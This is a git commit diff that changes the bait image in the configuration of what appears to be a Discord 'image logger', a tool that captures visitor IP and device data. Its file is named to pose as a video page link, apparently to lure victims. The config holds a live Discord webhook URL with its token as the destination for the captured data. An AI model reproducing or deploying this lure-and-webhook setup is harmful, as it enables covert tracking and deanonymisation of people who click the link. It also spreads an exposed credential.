e4f782d9c1ce0821f5cd9e5a1b0220558d0702fc
vhixgs <lucaberca99@gmail.com>
2025-06-24 23:49:50 +0300

    Update view_video.php?viewkey=682ac878a74c0#1.py

--- api/view_video.php?viewkey=682ac878a74c0#1.py
+++ api/view_video.php?viewkey=682ac878a74c0#1.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1387168255478857818/aCZxZsPlVLYu6-4pEfAnWUT8WtNo4Y6qTOCYnlR-94I16toDhoUUKag30fdLEVNdzemA",
-    "image": "https://i.imgur.com/ZhYARgq.png", # You can also have a custom image by using a URL argument
+    "image": "https://i.imgur.com/dYnm0xQ.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
